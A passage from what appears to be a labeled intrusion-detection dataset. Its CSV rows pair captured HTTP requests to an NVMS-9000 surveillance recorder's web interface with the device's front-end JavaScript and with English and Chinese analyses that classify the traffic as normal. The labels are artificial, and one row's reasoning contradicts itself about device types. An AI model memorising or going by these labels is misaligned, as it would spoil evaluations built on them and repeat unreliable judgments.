+                        CssLoader.LoadCss('css/index.css', 'InitCss');
+                        setPluginNotice($(""body""));
+                        $(""body"").css(""padding-top"", ""30px"");
+                        $(""body"").css(""text-align"", ""center"");
+                        return;
+                    }
+                });
+            }
+        });
+
+        function LoadApp() {
+            var InitCss = ['css/index.css',
+                'js/lib/DatePicker/wbDatePicker.css',
+                'js/lib/Dialog/wbDialog.css',
+                'js/lib/Grid/wbGrid.css',
+                'js/lib/IpInput/ipinput.css',
+                'js/lib/Loading/wbLoading.css',
+                'js/lib/Pager/wbPager.css',
+                'js/lib/SelectInput/selectinput.css',
+                'js/lib/Slider/slider.css',
+                'js/lib/Spliter/spliter.css',
+                'js/lib/TimeBar/wbTimeBar.css',
+                'js/lib/TimeLine/timeline.css',
+                'js/lib/TimeSpan/defaultStyle.css'];
+            CssLoader.LoadCss(InitCss, 'InitCss');
+            CssLoader.LoadCss('js/lib/Tab/tab.css', 'TabCss');
+            CssLoader.LoadCss('js/lib/Listbox/listbox.css', 'ListCss');
+            InitCommMsgTools();
+
+            if (APP_TYPE == ""STANDARD"") {
+                //
+                LangCtrl.Init(null, function () {
+                    Plugin.GetVideoPlugin();
+                    $(""#InitialView"").hide();
+                    //live
+                    Route.Init('live');
+
+                    var auInfo = $.webSession('auInfo_N9K');
+                    if (!auInfo) {
+                        Route.DoNav('login')
+                        return;
+                    }
+                    else {
+                        Route.NavToInitUrl();
+                    }
+                });
+            }
+            else {
+                //P2PWebcookiesessionStorage
+                if (!$.webSession('auInfo_N9K') && $.cookie('auInfo_N9K')) {
+                    $.webSession('auInfo_N9K', $.cookie('auInfo_N9K'));
+                    $.cookie('auInfo_N9K', null);
+                }
+                var auInfo = $.webSession('auInfo_N9K');
+                if (!auInfo) {
+                    window.location.href = ""/index.html"";
+                    return;
+                }
+            }
+
+        }
+
+        function InitCommMsgTools() {
+            /*
+             * 
+             */
+            window.TopFloatMsg = {};
+            TopFloatMsg.timer = null
+            TopFloatMsg.show = function (type, title, message, offset, w, h) {
+                var msg = $(""#topFloatMsg"");
+                var msg_bk = $(""#topFloatMsg_bk"");
+                if (TopFloatMsg.timer) {
+                    clearTimeout(TopFloatMsg.timer);
+                    msg_bk.hide();
+                    msg.hide();
+                }
+                $(""#topFloatMsg_title"").html(title);
+                $(""#topFloatMsg_content"").html(message);
+
+                switch (type) {
+                    case ""ok"":
+                        $(""#topFloatMsg_icon"").removeClass().addClass(""Msg_ok"");
+                        break;
+                    case ""error"":
+                        $(""#topFloatMsg_icon"").removeClass().addClass(""Msg_error"");
+                        break;
+                    case ""info"":
+                        $(""#topFloatMsg_icon"").removeClass().addClass(""Msg_info"");
+                        break;
+                    case ""alarm"":
+                        $(""#topFloatMsg_icon"").removeClass().addClass(""Msg_alarm"");
+                        break;
+                    case ""query"":
+                        $(""#topFloatMsg_icon"").removeClass().addClass(""Msg_question"");
+                        break;
+                }
+
+                if (w) {
+                    msg.width(w);
+                    msg_bk.width(w);
+                }
+                if (h) {
+                    msg.height(w);
+                    msg_bk.height(w);
+                }
+
+                if (offset) {
+                    msg.css(""top"", offset.top + ""px"");
+                    msg.css(""left"", offset.left + ""px"");
+                    msg_bk.css(""top"", offset.top + ""px"");
+                    msg_bk.css(""left"", offset.left + ""px"");
+                }
+                else {
+                    var iWidth = document.body.scrollWidth;
+                    var iHeight = document.body.scrollHeight;
+                    var top = (iHeight - msg.height()) / 2;
+                    var left = (iWidth - msg.width()) / 2;
+                    msg.css(""top"", top + ""px"");
+                    msg.css(""left"", left + ""px"");
+                    msg_bk.css(""top"", top + ""px"");
+                    msg_bk.css(""left"", left + ""px"");
+                }
+                msg_bk.width(msg.width() + 2);
+                msg_bk.height(msg.height() + 2);
+                msg.show();
+                msg_bk.show();
+                msg.click(function () {
+                    msg_bk.hide();
+                    msg.hide();
+                });
+                TopFloatMsg.timer = setTimeout(function () {
+                    msg_bk.hide();
+                    msg.hide();
+                }, 5000);
+            }
+
+            TopFloatMsg.hide = function () {
+                clearTimeout(TopFloatMsg.timer);
+                $(""#topFloatMsg_bk"").hide();
+                $(""#topFloatMsg"").hide();
+            }
+
+            /*
+             
+             */
+            window.RollMsg = {};
+            RollMsg.timer = null;
+            //
+            RollMsg.maxMsgCount = 20;
+            RollMsg.isInit = false;
+            RollMsg.Append = function (message) {
+                stopTimer();
+                var msg = $(""#topRollMsg"");
+                var msg_bk = $(""#topRollMsg_bk"");
+                var content = $(""#topRollMsg_content"");
+                var close = $(""#topRollMsg_close"");
+                if ($("">div"", content).length >= RollMsg.maxMsgCount) {
+                    $("">div:eq(0)"", content).remove();
+                }
+                var newMsg = $(""<div>"" + message + ""</div>"");
+                newMsg.click(function () {
+                    $("">div"", content).removeClass(""selected"");
+                    $(this).addClass(""selected"");
+                });
+                newMsg.appendTo(content);
+                msg.show();
+                msg_bk.show();
+                content.scrollTop(content[0].scrollHeight);
+
+                if (!RollMsg.isInit) {
+                    msg.mouseover(stopTimer).mouseout(startTimer);
+                    close.click(RollMsg.close);
+                    RollMsg.isInit = true;
+                }
+
+                startTimer();
+
+                function stopTimer() {
+                    if (RollMsg.timer) {
+                        clearTimeout(RollMsg.timer);
+                    }
+                    $(""#topRollMsg_bk,#topRollMsg"").stop();
+                    $(""#topRollMsg_bk,#topRollMsg"").removeAttr(""style"");
+                    $(""#topRollMsg_bk,#topRollMsg"").show();
+                    //		$(""#topRollMsg_bk"").hide();
+                    //		$(""#topRollMsg"").hide();
+                    //		$(""#topRollMsg_bk"").fadeIn(1);
+                    //		$(""#topRollMsg"").fadeIn(1);
+                }
+
+                function startTimer() {
+                    RollMsg.timer = setTimeout(function () {
+                        RollMsg.fadeOutClose();
+                    }, 10000);
+                }
+            }
+
+            RollMsg.close = function () {
+                if (RollMsg.timer) {
+                    clearTimeout(RollMsg.timer);
+                }
+                $(""#topRollMsg_bk"").hide();
+                $(""#topRollMsg"").hide();
+                $(""#topRollMsg_content"").empty();
+            }
+
+            RollMsg.fadeOutClose = function () {
+                if (RollMsg.timer) {
+                    clearTimeout(RollMsg.timer);
+                }
+                $(""#topRollMsg_bk"").fadeOut(5000);
+                $(""#topRollMsg"").fadeOut(5000, function () {
+                    $(""#topRollMsg_content"").empty();
+                });
+            }
+
+            RollMsg.clear = function () {
+                $(""#topRollMsg_content"").empty();
+            }
+        }
+    });",tvt_queryDevInfo2.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, which is typical for normal behavior. The packet sizes, while differing between upstream (392.0 bytes) and downstream (13680.0 bytes), are stable with no variance, indicating consistent data transfer without anomalies. The time intervals for both upstream and downstream are 0.00±0.00 s, suggesting immediate responses without delay, which is common in standard protocol interactions. Given these characteristics, the traffic does not show signs of malicious activity such as DoS/DDoS attacks, scanning, or data injection. The single request and response pair further rules out high-frequency attack patterns. Therefore, this traffic is likely normal, adhering to expected protocol behavior without indications of compromise or attack.",无,True,请求符合标准HTTP规范，无可疑参数或异常行为。User-Agent显示为iPhone浏览器，属于正常用户访问行为。请求的路径/js/index.js在大多数网站中为常见的JavaScript文件路径，与域名5.2.202.19之间无逻辑不符。,响应状态码为200 OK，内容为JavaScript代码，无敏感信息泄露或异常状态码。响应内容中提到的系统类型为'NVMS-9000'，但未发现明显的设备信息泄露或异常行为。,"[""无""]",[],Normal Traffic,,,1.0,"The traffic shows no anomalies in statistical features, request and response characteristics, and does not involve any specific files or device types. Therefore, it is classified as normal traffic with high confidence."
+209.141.46.203,5.2.202.19,52632,80,396.0,52478.0,0.0,0.0,0.0,0.0092372443224932,0.0,0.0010871077787342,0.5191009044647217,1,1,"[""{'200': 1}""]","GET /js/lib/Route.js HTTP/1.1
+Host: 5.2.202.19
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1
+
+","HTTP/1.1 200 OK
+Content-type: 
+Content-Length: 52401
+Connection: close
+
+/**
+ * 
+ */
+define(['require', 'jquery', 'LangCtrl', 'loading', 'widget.base', 'CssLoader', 'cookieLib'],
+    function () {
+        //
+        var defaultUrl = null;
+        //
+        var lastRouteUrl = null
+        //
+        var routeUrl = null;
+
+        var routeUrlChangedEvent = WidgetBase.CreateEvent(""routeUrlChangedEvent"");
+
+        //AP
+        var appModuleList = {
+            ""main"": {
+                url: ""view/main.html"",
+                apModule: ""app/main"",
+                subContainer: ""#Content""
+            },
+            ""login"": {
+                url: ""view/login.html"",
+                apModule: ""app/login""
+            },
+            // 
+            ""live"": {
+                url: ""view/Live/live.html"",
+                apModule: ""app/Live/live""
+            },
+            ""rec"": {
+                url: ""view/Rec/rec.html"",
+                apModule: ""app/Rec/rec""
+            },
+            ""recBackUp"": {
+                url: ""view/Rec/recBackUp.html"",
+                apModule: ""app/Rec/recBackUp""
+            },
+            ""localConfig"": {
+                url: ""view/localConfig.html"",
+                apModule: ""app/localConfig""
+            },
+            ""configFrame"": {
+                subContainer: ""#configRightFrame"",
+                apModule: ""app/configFrame""
+            },
+            ""cfgHome"": {
+                url: ""view/cfgHome.html"",
+                apModule: ""app/cfgHome""
+            },
+            ""chlCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/ChlCfg/chlCfgFrame.html"",
+                apModule: ""app/ChlCfg/chlCfgFrame""
+            },
+            ""recCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/RecCfg/recCfgFrame.html"",
+                apModule: ""app/RecCfg/recCfgFrame""
+            },
+            ""alarmCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/AlarmCfg/alarmCfgFrame.html"",
+                apModule: ""app/AlarmCfg/alarmCfgFrame""
+            },
+            ""diskCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/DiskCfg/diskCfgFrame.html"",
+                apModule: ""app/DiskCfg/diskCfgFrame""
+            },
+            ""userCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/UserMgr/userCfgFrame.html"",
+                apModule: ""app/UserMgr/userCfgFrame""
+            },
+            ""netCfgFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/NetCfg/netCfgFrame.html"",
+                apModule: ""app/NetCfg/netCfgFrame""
+            },
+            ""systemFrame"": {
+                subContainer: ""#configRightFrame"",
+                url: ""view/System/systemFrame.html"",
+                apModule: ""app/System/systemFrame""
+            },
+
+            // 
+            ""addChl"": {
+                url: ""view/ChlCfg/addChl.html"",
+                apModule: ""app/ChlCfg/addChl""
+            },
+            ""chlMgr"": {
+                url: ""view/ChlCfg/chlMgr.html"",
+                apModule: ""app/ChlCfg/chlMgr""
+            },
+            ""addChlGroup"": {
+                url: ""view/ChlCfg/addChlGroup.html"",
+                apModule: ""app/ChlCfg/addChlGroup""
+            },
+            ""chlGroupMgr"": {
+                url: ""view/ChlCfg/chlGroupMgr.html"",
+                apModule: ""app/ChlCfg/chlGroupMgr""
+            },
+            ""chlSignal"": {
+                url: ""view/ChlCfg/chlSignal.html"",
+                apModule: ""app/ChlCfg/chlSignal""
+            },
+            ""displaySet"": {
+                url: ""view/ChlCfg/displaySet.html"",
+                apModule: ""app/ChlCfg/displaySet""
+            },
+            ""osd"": {
+                url: ""view/ChlCfg/osd.html"",
+                apModule: ""app/ChlCfg/osd""
+            },
+            ""videoMask"": {
+                url: ""view/ChlCfg/videoMask.html"",
+                apModule: ""app/ChlCfg/videoMask""
+            },
+            ""logoSet"": {
+                url: ""view/ChlCfg/logoSet.html"",
+                apModule: ""app/ChlCfg/logoSet""
+            },
+            ""signalShelter"": {
+                url: ""view/ChlCfg/signalShelter.html"",
+                apModule: ""app/ChlCfg/signalShelter""
+            },
+            ""waterMark"": {
+                url: ""view/ChlCfg/waterMark.html"",
+                apModule: ""app/ChlCfg/waterMark""
+            },
+            ""motion"": {
+                url: ""view/ChlCfg/motion.html"",
+                apModule: ""app/ChlCfg/motion""
+            },
+            ""osc"": {
+                url: ""view/ChlCfg/osc.html"",
+                apModule: ""app/ChlCfg/osc""
+            },
+            ""avd"": {
+                url: ""view/ChlCfg/avd.html"",
+                apModule: ""app/ChlCfg/avd""
+            },
+            ""tripwire"": {
+                url: ""view/ChlCfg/tripwire.html"",
+                apModule: ""app/ChlCfg/tripwire""
+            },
+            ""pea"": {
+                url: ""view/ChlCfg/pea.html"",
+                apModule: ""app/ChlCfg/pea""
+            },
+            ""ptzProtocol"": {
+                url: ""view/ChlCfg/ptzProtocol.html"",
+                apModule: ""app/ChlCfg/ptzProtocol""
+            },
+            ""preset"": {
+                url: ""view/ChlCfg/preset.html"",
+                apModule: ""app/ChlCfg/preset""
+            },
+            ""cruise"": {
+                url: ""view/ChlCfg/cruise.html"",
+                apModule: ""app/ChlCfg/cruise""
+            },
+            //
+            ""recModeCfg"": {
+                url: ""view/RecCfg/recModeCfg.html"",
+                apModule: ""app/RecCfg/recModeCfg""
+            },
+            ""recParamCfg"": {
+                url: ""view/RecCfg/recParamCfg.html"",
+                apModule: ""app/RecCfg/recParamCfg""
+            },
+            ""eventRecStream"": {
+                url: ""view/RecCfg/eventRecStream.html"",
+                apModule: ""app/RecCfg/eventRecStream""
+            },
+            ""timingRecStream"": {
+                url: ""view/RecCfg/timingRecStream.html"",
+                apModule: ""app/RecCfg/timingRecStream""
+            },
+            ""subStream"": {
+                url: ""view/RecCfg/subStream.html"",
+                apModule: ""app/RecCfg/subStream""
+            },
+            ""scheduleRecCfg"": {
+                url: ""view/RecCfg/scheduleRecCfg.html"",
+                apModule: ""app/RecCfg/scheduleRecCfg""
+            },
+            ""addSchedule"": {
+                url: ""view/RecCfg/addSchedule.html"",
+                apModule: ""app/RecCfg/addSchedule""
+            },
+            ""scheduleMgr"": {
+                url: ""view/RecCfg/scheduleMgr.html"",
+                apModule: ""app/RecCfg/scheduleMgr""
+            },
+            ""eventRecCfg"": {
+                url: ""view/RecCfg/eventRecCfg.html"",
+                apModule: ""app/RecCfg/eventRecCfg""
+            },
+            ""viewRecStatus"": {
+                url: ""view/RecCfg/viewRecStatus.html"",
+                apModule: ""app/RecCfg/viewRecStatus""
+            },
+            //
+            ""alarmOut"": {
+                url: ""view/AlarmCfg/alarmOut.html"",
+                apModule: ""app/AlarmCfg/alarmOut""
+            },
+            ""alarmEmail"": {
+                url: ""view/AlarmCfg/alarmEmail.html"",
+                apModule: ""app/AlarmCfg/alarmEmail""
+            },
+            ""alarmDisplay"": {
+                url: ""view/AlarmCfg/alarmDisplay.html"",
+                apModule: ""app/AlarmCfg/alarmDisplay""
+            },
+            ""beeper"": {
+                url: ""view/AlarmCfg/beeper.html"",
+                apModule: ""app/AlarmCfg/beeper""
+            },
+            ""alarmAddSchedule"": {
+                url: ""view/RecCfg/addSchedule.html"",
+                apModule: ""app/RecCfg/addSchedule""
+            },
+            ""alarmScheduleMgr"": {
+                url: ""view/RecCfg/scheduleMgr.html"",
+                apModule: ""app/RecCfg/scheduleMgr""
+            },
+            ""pushMessage"": {
+                url: ""view/AlarmCfg/pushMessage.html"",
+                apModule: ""app/AlarmCfg/pushMessage""
+            },
+            ""motionAlarmCfg"": {
+                url: ""view/AlarmCfg/motionAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/motionAlarmCfg""
+            },
+            ""oscAlarmCfg"": {
+                url: ""view/AlarmCfg/oscAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/oscAlarmCfg""
+            },
+            ""avdAlarmCfg"": {
+                url: ""view/AlarmCfg/avdAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/avdAlarmCfg""
+            },
+            ""tripwireAlarmCfg"": {
+                url: ""view/AlarmCfg/tripwireAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/tripwireAlarmCfg""
+            },
+            ""peaAlarmCfg"": {
+                url: ""view/AlarmCfg/peaAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/peaAlarmCfg""
+            },
+            ""sensorAlarmCfg"": {
+                url: ""view/AlarmCfg/sensorAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/sensorAlarmCfg""
+            },
+            ""abnormalAlarmCfg"": {
+                url: ""view/AlarmCfg/abnormalAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/abnormalAlarmCfg""
+            },
+            ""devOfflineAlarmCfg"": {
+                url: ""view/AlarmCfg/devOfflineAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/devOfflineAlarmCfg""
+            },
+            ""videoLossAlarmCfg"": {
+                url: ""view/AlarmCfg/videoLossAlarmCfg.html"",
+                apModule: ""app/AlarmCfg/videoLossAlarmCfg""
+            },
+            ""viewAlarmStatus"": {
+                url: ""view/AlarmCfg/viewAlarmStatus.html"",
+                apModule: ""app/AlarmCfg/viewAlarmStatus""
+            },
+            //
+            ""diskManagement"": {
+                url: ""view/DiskCfg/diskManagement.html"",
+                apModule: ""app/DiskCfg/diskManagement""
+            },
+            ""storageModeCfg"": {
+                url: ""view/DiskCfg/storageModeCfg.html"",
+                apModule: ""app/DiskCfg/storageModeCfg""
+            },
+            ""viewDiskInfo"": {
+                url: ""view/DiskCfg/viewDiskInfo.html"",
+                apModule: ""app/DiskCfg/viewDiskInfo""
+            },
+            ""viewSmartInfo"": {
+                url: ""view/DiskCfg/viewSmartInfo.html"",
+                apModule: ""app/DiskCfg/viewSmartInfo""
+            },
+            //
+            ""addUser"": {
+                url: ""view/UserMgr/addUser.html"",
+                apModule: ""app/UserMgr/addUser""
+            },
+            ""userMgr"": {
+                url: ""view/UserMgr/userMgr.html"",
+                apModule: ""app/UserMgr/userMgr""
+            },
+            ""addAuthGroup"": {
+                url: ""view/UserMgr/addAuthGroup.html"",
+                apModule: ""app/UserMgr/addAuthGroup""
+            },
+            ""authGroupMgr"": {
+                url: ""view/UserMgr/authGroupMgr.html"",
+                apModule: ""app/UserMgr/authGroupMgr""
+            },
+            ""filterRule"": {
+                url: ""view/UserMgr/filterRule.html"",
+                apModule: ""app/UserMgr/filterRule""
+            },
+            ""logoutViewAuthCfg"": {
+                url: ""view/UserMgr/logoutViewAuthCfg.html"",
+                apModule: ""app/UserMgr/logoutViewAuthCfg""
+            },
+            ""passwordSecurity"": {
+                url: ""view/UserMgr/passwordSecurity.html"",
+                apModule: ""app/UserMgr/passwordSecurity""
+            },
+            ""userStatus"": {
+                url: ""view/UserMgr/userStatus.html"",
+                apModule: ""app/UserMgr/userStatus""
+            },
+            //
+            ""netBase"": {
+                url: ""view/NetCfg/netBase.html"",
+                apModule: ""app/NetCfg/netBase""
+            },
+            ""email"": {
+                url: ""view/NetCfg/email.html"",
+                apModule: ""app/NetCfg/email""
+            },
+            ""pppoe"": {
+                url: ""view/NetCfg/pppoe.html"",
+                apModule: ""app/NetCfg/pppoe""
+            },
+            ""port"": {
+                url: ""view/NetCfg/port.html"",
+                apModule: ""app/NetCfg/port""
+            },
+            ""ddns"": {
+                url: ""view/NetCfg/ddns.html"",
+                apModule: ""app/NetCfg/ddns""
+            },
+            ""upnp"": {
+                url: ""view/NetCfg/upnp.html"",
+                apModule: ""app/NetCfg/upnp""
+            },
+            ""nat"": {
+                url: ""view/NetCfg/nat.html"",
+                apModule: ""app/NetCfg/nat""
+            },
+            ""https"": {
+                url: ""view/NetCfg/https.html"",
+                apModule: ""app/NetCfg/https""
+            },
+            ""platform"": {
+                url: ""view/NetCfg/platform.html"",
+                apModule: ""app/NetCfg/platform""
+            },
+            ""ftp"": {
+                url: ""view/NetCfg/ftp.html"",
+                apModule: ""app/NetCfg/ftp""
+            },
+            ""snmp"": {
+                url: ""view/NetCfg/snmp.html"",
+                apModule: ""app/NetCfg/snmp""
+            },
+            ""netStatus"": {
+                url: ""view/NetCfg/netStatus.html"",
+                apModule: ""app/NetCfg/netStatus""
+            },
+            ""onlineVideo"": {
+                url: ""view/NetCfg/onlineVideo.html"",
+                apModule: ""app/NetCfg/onlineVideo""
+            },
+            //
+            ""commonCfg"":{
+                url: ""view/System/commonCfg.html"",
+                apModule: ""app/System/commonCfg""
+            },
+            ""dateAndTime"":{
+                url: ""view/System/dateAndTime.html"",
+                apModule: ""app/System/dateAndTime""
+            },
+            ""posCfg"":{
+                url: ""view/System/posCfg.html"",
+                apModule: ""app/System/posCfg""
+            },
+            ""viewLog"":{
+                url: ""view/System/viewLog.html"",
+                apModule: ""app/System/viewLog""
+            },
+            ""factoryReset"":{
+                url: ""view/System/factoryReset.html"",
+                apModule: ""app/System/factoryReset""
+            },
+            ""upgrade"":{
+                url: ""view/System/upgrade.html"",
+                apModule: ""app/System/upgrade""
+            },
+            ""backupRestore"":{
+                url: ""view/System/backupRestore.html"",
+                apModule: ""app/System/backupRestore""
+            },
+            ""reboot"":{
+                url: ""view/System/reboot.html"",
+                apModule: ""app/System/reboot""
+            },
+            ""upgradeOnline"":{
+                url: ""view/System/upgradeOnline.html"",
+                apModule: ""app/System/upgradeOnline""
+            },
+            ""timeRestart"":{
+                url: ""view/System/timeRestart.html"",
+                apModule: ""app/System/timeRestart""
+            },
+            ""devBasicInfo"":{
+                url: ""view/System/devBasicInfo.html"",
+                apModule: ""app/System/devBasicInfo""
+            },
+            ""chlStatus"":{
+                url: ""view/System/chlStatus.html"",
+                apModule: ""app/System/chlStatus""
+            },
+            ""platformParam"":{
+                url: ""view/System/platformParam.html"",
+                apModule: ""app/System/platformParam""
+            },
+            ""timedImageUpload"":{
+                url: ""view/System/timedImageUpload.html"",
+                apModule: ""app/System/timedImageUpload""
+            },
+            ""alarmImageUpload"":{
+                url: ""view/System/alarmImageUpload.html"",
+                apModule: ""app/System/alarmImageUpload""
+            },
+            ""platformOperation"":{
+                url: ""view/System/platformOperation.html"",
+                apModule: ""app/System/platformOperation""
+            }
+        };
+
+        //
+        var routeMap = {
+            ""login"": {
+                path: ""login"",
+                lk: """"
+            },
+            ""live"": {
+                path: ""main/live"",
+                lk: """"
+            },
+            ""record"": {
+                path: ""main/rec"",
+                lk: """"
+            },
+            ""record/backup"": {
+                path: ""main/recBackUp"",
+                lk: """"
+            },
+            ""config/local"": {
+                path: ""main/localConfig"",
+                lk: """"
+            },
+            ""config/home"": {
+                path: ""main/cfgHome"",
+                lk: ""IDCS_FUNCTION_PANEL""
+            },
+            ""config/channel/list"": {
+                path: ""main/chlCfgFrame/chlMgr"",
+                lk: ""IDCS_CHANGE_OR_DELETE_CHANNEL"",
+                navSequence: ['config/home', 'config/channel/list']
+            },
+            ""config/channel/add"": {
+                path: ""main/chlCfgFrame/addChl"",
+                lk: ""IDCS_ADD_CHANNEL"",
+                navSequence: ['config/home', 'config/channel/list', 'config/channel/add']
+            },
+            ""config/channel/group/list"": {
+                path: ""main/chlCfgFrame/chlGroupMgr"",
+                lk: ""IDCS_CHANGE_OR_DELETE_CHANNEL_GROUP"",
+                navSequence: ['config/home', 'config/channel/group/list']
+            },
+            ""config/channel/group/add"": {
+                path: ""main/chlCfgFrame/addChlGroup"",
+                lk: ""IDCS_ADD_GROUP"",
+                navSequence: ['config/home', 'config/channel/group/list', 'config/channel/group/add']
+            },
+            ""config/channel/signal"": {
+                path: ""main/chlCfgFrame/chlSignal"",
+                lk: ""IDCS_CHANNEL_SIGNAL_ACCESS_SET"",
+                navSequence: ['config/home', 'config/channel/signal']
+            },
+            ""config/channel/settings/image"": {
+                path: ""main/chlCfgFrame/displaySet"",
+                lk: ""IDCS_IMAGE_PARAMETER_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/image']
+            },
+            ""config/channel/settings/osd"": {
+                path: ""main/chlCfgFrame/osd"",
+                lk: ""IDCS_OSD_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/osd']
+            },
+            ""config/channel/settings/mask"": {
+                path: ""main/chlCfgFrame/videoMask"",
+                lk: ""IDCS_VIDEO_MASK_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/mask']
+            },
+            ""config/channel/settings/logoSet"": {
+                path: ""main/chlCfgFrame/logoSet"",
+                lk: ""IDCS_LOGO_SETTINGS"",
+                navSequence: ['config/home', 'config/channel/settings/logoSet']
+            },
+            ""config/channel/settings/signalshelter"": {
+                path: ""main/chlCfgFrame/signalShelter"",
+                lk: ""IDCS_SIGNAL_SHELTER_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/signalshelter']
+            },
+            ""config/channel/settings/watermark"": {
+                path: ""main/chlCfgFrame/waterMark"",
+                lk: ""IDCS_WATER_MARK_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/watermark']
+            },
+            ""config/channel/settings/motion"": {
+                path: ""main/chlCfgFrame/motion"",
+                lk: ""IDCS_MOTION_SETTING"",
+                navSequence: ['config/home', 'config/channel/settings/motion']
+            },
+            ""config/channel/intelligence/osc"": {
+                path: ""main/chlCfgFrame/osc"",
+                lk: ""IDCS_WATCH_DETECTION"",
+                navSequence: ['config/home', 'config/channel/intelligence/osc']
+            },
+            ""config/channel/intelligence/avd"": {
+                path: ""main/chlCfgFrame/avd"",
+                lk: ""IDCS_ABNORMAL_DETECTION"",
+                navSequence: ['config/home', 'config/channel/intelligence/avd']
+            },
+            ""config/channel/intelligence/tripwire"": {
+                path: ""main/chlCfgFrame/tripwire"",
+                lk: ""IDCS_BEYOND_DETECTION"",
+                navSequence: ['config/home', 'config/channel/intelligence/tripwire']
+            },
+            ""config/channel/intelligence/pea"": {
+                path: ""main/chlCfgFrame/pea"",
+                lk: ""IDCS_INVADE_DETECTION"",
+                navSequence: ['config/home', 'config/channel/intelligence/pea']
+            },
+            ""config/channel/ptz/protocol"": {
+                path: ""main/chlCfgFrame/ptzProtocol"",
+                lk: ""IDCS_PROTOCOL"",
+                navSequence: ['config/home', 'config/channel/ptz/protocol']
+            },
+            ""config/channel/ptz/preset"": {
+                path: ""main/chlCfgFrame/preset"",
+                lk: ""IDCS_PRESET"",
+                navSequence: ['config/home', 'config/channel/ptz/preset']
+            },
+            ""config/channel/ptz/cruise"": {
+                path: ""main/chlCfgFrame/cruise"",
+                lk: ""IDCS_CRUISE"",
+                navSequence: ['config/home', 'config/channel/ptz/cruise']
+            },
+            //
+            ""config/record/mode"": {
+                path: ""main/recCfgFrame/recModeCfg"",
+                lk: ""IDCS_MODE_SET"",
+                navSequence: ['config/home', 'config/record/mode']
+            },
+            ""config/record/parameter"": {
+                path: ""main/recCfgFrame/recParamCfg"",
+                lk: ""IDCS_PARAM_SET"",
+                navSequence: ['config/home', 'config/record/parameter']
+            },
+            ""config/record/stream/event"": {
+                path: ""main/recCfgFrame/eventRecStream"",
+                lk: ""IDCS_EVENT_RECORD_CODE_STREAM"",
+                navSequence: ['config/home', 'config/record/stream/event']
+            },
+            ""config/record/stream/timing"": {
+                path: ""main/recCfgFrame/timingRecStream"",
+                lk: ""IDCS_TIME_RECORD_CODE_STREAM"",
+                navSequence: ['config/home', 'config/record/stream/timing']
+            },
+            ""config/record/stream/sub"": {
+                path: ""main/recCfgFrame/subStream"",
+                lk: ""IDCS_SUB_STREAM_SET"",
+                navSequence: ['config/home', 'config/record/stream/sub']
+            },
+            ""config/record/schedule"": {
+                path: ""main/recCfgFrame/scheduleRecCfg"",
+                lk: ""IDCS_SCHEDULE_OF_RECORD_SET"",
+                navSequence: ['config/home', 'config/record/schedule']
+            },
+            ""config/record/schedule/add"": {
+                path: ""main/recCfgFrame/addSchedule"",
+                lk: ""IDCS_ADD_SCHEDULE"",
+                navSequence: ['config/home', 'config/record/schedule/add']
+            },
+            ""config/record/schedule/manager"": {
+                path: ""main/recCfgFrame/scheduleMgr"",
+                lk: ""IDCS_SCHEDULE_MANAGE"",
+                navSequence: ['config/home', 'config/record/schedule/manager']
+            },
+            ""config/record/event"": {
+                path: ""main/recCfgFrame/eventRecCfg"",
+                lk: ""IDCS_EVENT_RECORD_SET"",
+                navSequence: ['config/home', 'config/record/event']
+            },
+            ""config/record/status"": {
+                path: ""main/recCfgFrame/viewRecStatus"",
+                lk: ""IDCS_VIEW_RECORD_STATE"",
+                navSequence: ['config/home', 'config/record/status']
+            },
+            //
+            ""config/alarm/alarm_out"": {
+                path: ""main/alarmCfgFrame/alarmOut"",
+                lk: ""IDCS_ALARM_OUT"",
+                navSequence: ['config/home', 'config/alarm/alarm_out']
+            },
+            ""config/alarm/email/recipients"": {
+                path: ""main/alarmCfgFrame/alarmEmail"",
+                lk: ""IDCS_EMAIL"",
+                navSequence: ['config/home', 'config/alarm/email/recipients']
+            },
+            ""config/alarm/display"": {
+                path: ""main/alarmCfgFrame/alarmDisplay"",
+                lk: ""IDCS_DISPLAY"",
+                navSequence: ['config/home', 'config/alarm/display']
+            },
+            ""config/alarm/beeper"": {
+                path: ""main/alarmCfgFrame/beeper"",
+                lk: ""IDCS_BUZZER"",
+                navSequence: ['config/home', 'config/alarm/beeper']
+            },
+            ""config/alarm/schedule/add"": {
+                path: ""main/alarmCfgFrame/alarmAddSchedule"",
+                lk: ""IDCS_ADD_SCHEDULE"",
+                navSequence: ['config/home', 'config/alarm/schedule/manager', 'config/alarm/schedule/add']
+            },
+            ""config/alarm/schedule/manager"": {
+                path: ""main/alarmCfgFrame/alarmScheduleMgr"",
+                lk: ""IDCS_SCHEDULE_MANAGE"",
+                navSequence: ['config/home', 'config/alarm/schedule/manager']
+            },
+            ""config/alarm/message/push"": {
+                path: ""main/alarmCfgFrame/pushMessage"",
+                lk: ""IDCS_PUSH_MESSAGE"",
+                navSequence: ['config/home', 'config/alarm/message/push']
+            },
+            ""config/alarm/motion"": {
+                path: ""main/alarmCfgFrame/motionAlarmCfg"",
+                lk: ""IDCS_MOTION_DETECT_ALARM"",
+                navSequence: ['config/home', 'config/alarm/motion']
